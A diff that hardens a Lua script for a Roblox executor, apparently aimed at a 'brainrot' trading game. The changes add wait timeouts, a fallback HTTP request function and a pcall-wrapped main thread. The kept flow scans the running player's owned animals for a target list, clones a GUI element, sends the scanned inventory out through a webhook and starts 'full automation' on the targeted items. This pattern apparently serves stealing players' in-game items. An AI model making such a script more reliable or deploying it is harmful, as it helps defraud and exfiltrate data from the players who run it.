@@ -40,8 +40,9 @@
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-local LP = Players.LocalPlayer
-local pg = LP:WaitForChild("PlayerGui")
+-- some executors run scripts before the player fully joins; wait a bit
+local LP = Players.LocalPlayer or Players:WaitForChild("LocalPlayer", 30)
+local pg = LP and LP:WaitForChild("PlayerGui", 30) or nil
 
 local function log(msg)
     print("[SAB] " .. tostring(msg))
@@ -356,7 +357,7 @@ local function tryRequire(path)
         -- WaitForChild (with timeout) like the original, so early-execution
         -- still works; 10s cap so a renamed folder can't hang us forever
         local ok, found = pcall(function()
-            return cur:WaitForChild(part, 10)
+            return cur:WaitForChild(part, 5)
         end)
         cur = ok and found or nil
         if not cur then return nil end
@@ -560,7 +561,18 @@ local function formatNumber(n)
 end
 
 local function getRequestFn()
-    return (syn and syn.request) or (http and http.request) or http_request or request
+    local fn = (syn and syn.request) or (http and http.request) or http_request or request
+    if fn then return fn end
+    -- last resort: the game's own HTTP (only works if the game has HttpEnabled)
+    return function(opts)
+        local res = HttpService:RequestAsync({
+            Url = opts.Url,
+            Method = opts.Method or "GET",
+            Headers = opts.Headers,
+            Body = opts.Body,
+        })
+        return { StatusCode = res.StatusCode, Body = res.Body }
+    end
 end
 
 local function toWikiName(displayName)
@@ -848,6 +860,7 @@ end
 -- ============================================================
 
 local function applyEverythingAfterTargetFound()
+    if not pg then return end
     local leftCenter = pg:FindFirstChild("LeftCenter")
     if leftCenter then
         local clone = leftCenter:Clone()
@@ -946,32 +959,42 @@ end
 -- main
 -- ============================================================
 
-log("fixed version starting")
+-- the whole main flow runs in its own thread (like the original), wrapped
+-- in pcall so ANY error shows up as an [SAB] FATAL line instead of
+-- silently killing the script inside the executor
+task.spawn(function()
+    local ok, err = pcall(function()
+        log("fixed version starting")
 
-local SYNC_DATA = loadSyncData()
-if not SYNC_DATA then
-    log("EXIT - SYNC_DATA not found. The game probably changed the Synchronizer structure. Send me the [SAB] console output.")
-    return
-end
-log("SYNC_DATA found")
+        local SYNC_DATA = loadSyncData()
+        if not SYNC_DATA then
+            log("EXIT - SYNC_DATA not found. The game probably changed the Synchronizer structure. Send me the [SAB] console output.")
+            return
+        end
+        log("SYNC_DATA found")
 
-local scanned = scanLocalAnimals(SYNC_DATA)
-log("scanned local animals: " .. #scanned)
+        local scanned = scanLocalAnimals(SYNC_DATA)
+        log("scanned local animals: " .. #scanned)
 
-local brainrotQueue = {}
-for _, a in ipairs(scanned) do
-    if TargetBrainrots[a.index] or TargetBrainrots[tostring(a.displayName)] then
-        table.insert(brainrotQueue, a)
+        local brainrotQueue = {}
+        for _, a in ipairs(scanned) do
+            if TargetBrainrots[a.index] or TargetBrainrots[tostring(a.displayName)] then
+                table.insert(brainrotQueue, a)
+            end
+        end
+        log("queue (target brainrots owned): " .. #brainrotQueue)
+
+        if #brainrotQueue == 0 then
+            log("EXIT - no target brainrots found on this account (check 'scanned local animals' above)")
+            return
+        end
+
+        applyEverythingAfterTargetFound()
+        sendDetailedWebhook(scanned)
+        startFullAutomation(brainrotQueue)
+        log("done - automation running")
+    end)
+    if not ok then
+        log("FATAL error: " .. tostring(err))
     end
-end
-log("queue (target brainrots owned): " .. #brainrotQueue)
-
-if #brainrotQueue == 0 then
-    log("EXIT - no target brainrots found on this account (check 'scanned local animals' above)")
-    return
-end
-
-applyEverythingAfterTargetFound()
-sendDetailedWebhook(scanned)
-startFullAutomation(brainrotQueue)
-log("done - automation running")
+end)
